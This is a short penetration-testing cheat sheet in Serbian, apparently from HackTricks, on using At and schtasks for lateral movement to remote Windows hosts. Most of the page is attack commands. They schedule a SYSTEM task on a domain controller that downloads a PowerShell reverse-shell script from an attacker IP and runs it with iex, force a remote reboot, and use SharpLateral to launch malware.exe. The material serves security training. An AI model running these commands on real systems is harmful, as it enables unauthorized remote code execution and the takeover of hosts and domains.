# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Kako to funkcioniše

At omogućava zakazivanje zadataka na hostovima gde znate korisničko ime/(lozinku/Hash). Dakle, možete ga koristiti za izvršavanje komandi na drugim hostovima i dobijanje izlaza.
```
At \\victim 11:00:00PM shutdown -r
```
Koristeći schtasks, prvo treba da kreirate zadatak, a zatim da ga pozovete:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Možete takođe koristiti [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Više informacija o [**korišćenju schtasks sa srebrnim karticama ovde**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
